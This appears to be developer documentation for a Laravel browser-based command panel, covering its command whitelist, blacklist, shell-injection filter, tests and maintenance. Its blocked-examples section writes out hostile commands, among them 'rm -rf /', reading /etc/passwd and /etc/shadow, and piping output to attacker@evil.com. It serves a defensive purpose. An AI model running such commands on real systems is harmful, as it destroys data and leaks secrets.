# Developer Command Execution Panel

## Overview
The Developer Command Execution Panel is a secure web interface that allows developers to execute whitelisted artisan and system commands directly from the browser.

## Access
- **URL**: `/panel/developer/commands`
- **Role Required**: Developer
- **Navigation**: Developer Panel → Command Execution

## Features

### Artisan Commands
Execute Laravel artisan commands without SSH access:

**Cache Management:**
- `cache:clear` - Clear application cache
- `config:clear` - Clear configuration cache
- `config:cache` - Cache configuration
- `route:clear` - Clear route cache
- `route:cache` - Cache routes
- `view:clear` - Clear compiled views
- `view:cache` - Cache views
- `optimize` - Optimize application
- `optimize:clear` - Clear all cached data

**Database:**
- `migrate` - Run database migrations
- `migrate:status` - Show migration status
- `migrate:fresh` - Drop all tables and re-run migrations
- `migrate:refresh` - Reset and re-run migrations
- `migrate:rollback` - Rollback last migration
- `db:seed` - Seed database

**RADIUS:**
- `radius:install` - Install RADIUS tables
- `radius:install --check` - Check RADIUS configuration
- `radius:install --force` - Force reinstall RADIUS tables
- `migrate --database=radius --path=database/migrations/radius` - Run RADIUS migrations

**Queue:**
- `queue:work` - Process queue jobs
- `queue:restart` - Restart queue workers
- `queue:clear` - Clear queue
- `queue:failed` - List failed queue jobs

**Other:**
- `composer:dump-autoload` - Regenerate autoload files
- `storage:link` - Create storage symbolic link
- `up` - Bring application out of maintenance
- `down` - Put application in maintenance mode

### System Commands
Execute system diagnostics and status commands:

**Network Diagnostics:**
- `ping` - Ping a host (e.g., `ping 8.8.8.8 -c 4`)
- `traceroute` - Trace route to host
- `nslookup` - DNS lookup
- `dig` - DNS query
- `host` - DNS host lookup

**System Status:**
- `uptime` - Show system uptime
- `free -h` - Show memory usage
- `df -h` - Show disk usage
- `top -bn1` - Show process list

**Build Tools:**
- `npm run build` - Build frontend assets
- `npm run prod` - Build for production

## Security

### Triple-Layer Protection

1. **Whitelist Validation**
   - Only pre-approved commands can be executed
   - Approximately 30 artisan commands
   - Approximately 10 system commands
   - Any command not in the whitelist is rejected with 403 Forbidden

2. **Blacklist Pattern Matching**
   - ~40 dangerous patterns are blocked
   - File operations: `rm`, `mv`, `cp`, `dd`, `mkfs`
   - System control: `shutdown`, `reboot`, `halt`, `kill`
   - User management: `userdel`, `passwd`, `chpasswd`
   - Sensitive data: `cat .env`, `cat /etc/shadow`
   - Database operations: `DROP DATABASE`, `TRUNCATE`, `DELETE FROM`
   - Network transfers: `ssh`, `scp`, `rsync`, `wget`
   - And more...

3. **Shell Injection Detection**
   - Blocks commands containing: `;`, `&&`, `||`, `|`, `` ` ``, `$()`, `<`, `>`, `&`
   - Prevents command chaining and redirection
   - Prevents variable substitution and command substitution

### Additional Security Features
- **Role Restriction**: Only users with developer role can access
- **Timeout**: System commands automatically timeout after 30 seconds
- **No Sudo**: Sudo commands are blocked
- **Read-Only Config**: Cannot modify .env or configuration files
- **No Database Destruction**: Cannot drop databases or tables

## Usage

### Quick Execute
Click any command button to execute it immediately. Output appears in the console below.

### Custom Commands
1. Enter command in the custom input field
2. Click "Execute" or press Enter
3. View output in the console

### Console Output
- **Green text**: Successful output
- **Red text**: Errors
- **Yellow text**: Warnings
- **Cyan text**: Success messages
- **Gray text**: Timestamps
- Click "Clear" to clear the console

## Examples

### Clear All Caches
```
php artisan optimize:clear
```

### Run RADIUS Setup
```
php artisan radius:install --check
```

### Check Disk Space
```
df -h
```

### Ping Google DNS
```
ping 8.8.8.8 -c 4
```

### Check System Memory
```
free -h
```

## Blocked Operations Examples

These commands will be rejected:

```bash
# Shell injection attempts
ping 8.8.8.8; rm -rf /
uptime && cat /etc/passwd
df -h | mail attacker@evil.com

# Dangerous operations
rm -rf /var/www
shutdown now
kill -9 1234

# Sensitive data access
cat .env
cat /etc/shadow
mysql -u root -p

# Database destruction
DROP DATABASE production;
TRUNCATE users;
```

## Testing

Run security tests:
```bash
php artisan test --filter=CommandExecutionSecurityTest
```

All 5 security tests should pass:
- ✅ Whitelisted commands allowed
- ✅ Non-whitelisted commands blocked
- ✅ Blacklisted patterns blocked
- ✅ Shell injection blocked
- ✅ Role restriction enforced

## Troubleshooting

### Command Not Allowed
**Issue**: Getting "Command not allowed" error

**Solution**: The command is not in the whitelist. Only pre-approved commands can be executed. If you need a command added, contact the system administrator.

### Timeout
**Issue**: Command times out after 30 seconds

**Solution**: System commands have a 30-second timeout. If a command takes longer, it will be terminated. Consider running long-running commands via SSH instead.

### Permission Denied
**Issue**: Getting 403 Forbidden error

**Solution**: Only users with developer role can access this panel. Ensure you're logged in with a developer account.

## Best Practices

1. **Use for Quick Tasks**: This panel is best for quick maintenance tasks, not long-running operations
2. **Check Output**: Always review the console output to ensure commands executed successfully
3. **Test First**: When running migrations or database operations, check status first
4. **Clear Console**: Clear the console regularly to avoid confusion with old output
5. **Don't Chain Commands**: Execute commands one at a time for clarity

## Maintenance

### Adding New Commands
To add a new safe command to the whitelist:

1. Edit `app/Http/Controllers/Panel/CommandExecutionController.php`
2. Add to `ALLOWED_ARTISAN_COMMANDS` or `ALLOWED_SYSTEM_COMMANDS`
3. Test the command thoroughly
4. Update this documentation

### Blocking New Patterns
To block additional dangerous patterns:

1. Edit `app/Http/Controllers/Panel/CommandExecutionController.php`
2. Add to `BLACKLISTED_PATTERNS`
3. Add test case in `tests/Feature/CommandExecutionSecurityTest.php`
4. Run tests to verify

## Security Audit

Last security audit: 2026-01-25
- ✅ Code review completed
- ✅ Security vulnerabilities addressed
- ✅ Shell injection protection verified
- ✅ All tests passing
- ✅ CodeQL scan passed

## Support

For issues or feature requests related to the command execution panel:
1. Check this documentation first
2. Review security test results
3. Contact system administrator
4. Report security concerns immediately
